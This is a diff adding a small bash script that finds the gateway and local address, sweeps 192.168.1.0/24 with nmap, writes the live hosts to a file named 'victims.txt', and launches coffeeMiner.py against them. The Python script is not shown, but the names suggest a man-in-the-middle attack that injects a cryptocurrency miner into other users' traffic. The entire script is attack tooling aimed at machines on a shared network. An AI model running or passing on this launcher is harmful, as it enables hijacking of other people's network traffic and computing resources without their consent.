@@ -1,0 +1,16 @@
+#!/bin/bash
+
+
+## VARIABLES ##
+
+gateway="$(route -n | awk '/UG/ {print $2}')"
+
+#interface="eth0"
+interface=$1
+
+local="$(ifconfig ${interface} | awk '/netmask/{print $2}')"
+
+###############
+
+nmap 192.168.1.1/24 -n -sP | grep report | awk '{print $5}' > victims.txt
+python3 coffeeMiner.py ${gateway} ${local} ${interface}
